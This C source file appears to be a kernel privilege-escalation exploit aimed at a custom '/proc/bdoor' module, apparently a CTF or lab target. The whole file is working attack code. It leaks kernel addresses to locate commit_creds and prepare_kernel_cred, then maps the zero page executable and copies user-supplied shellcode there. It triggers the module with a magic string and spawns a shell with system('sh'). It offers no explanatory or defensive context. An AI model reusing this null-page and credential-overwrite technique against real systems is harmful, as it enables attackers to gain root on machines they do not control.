#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

void get_leak(){
	int fd;
	char *get_value;
	unsigned long leak[300];
	unsigned long address;
	unsigned long commit;
	unsigned long prep_kern;

	fd = open("/proc/bdoor", O_RDWR);
	if (fd < 0){
		printf("cant open device\n");
	}
	else{
		printf("device opened\n");
		get_value = read(fd, leak, sizeof(leak));
		for(int i = 0; i < 10; i++){
			printf("leak 0x%lx \n", leak[i]);
		}
		address = leak[0] - 0xa4062L;
		commit = address + 0x87d90L;
		prep_kern = address + 0x87fc0L;
		printf("[+] Raw leak: 0x%lx\n", leak[0]);
		printf("[+] commit_creds: 0x%lx\n", commit);
		printf("[+] prepare_kernel_cred: 0x%lx\n", prep_kern);

		close(fd);
	}
}

void exploit(){
    char payload[16];
    printf("shellcode: ");
    scanf("%s", payload);
    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);
    if(addr != 0){
        printf("[*]Unable to map zero page.\n");
        exit(-1);
    }
  
    printf("[*] Mapped zero page.\n");
    memcpy(0, &payload, sizeof(payload));
  
    int fd = open("/proc/bdoor", O_WRONLY);
    if(0 < fd){
        write(fd, "rightthisway\n", 16);
        system("sh");
    }else{
        printf("Failed to open file.\n");
    }

}

int main(int argc, char *argv[]){
    char *argone = argv[1]; // choose
    int result;
    if(strcmp(argone, "leak") == 0){
        get_leak();
    }

    else if(strcmp(argone, "exp") == 0){
	exploit();
	
    }

    else{
	printf("./exploit leak\n./exploit exp shellcode_here\n");
    }

	

}
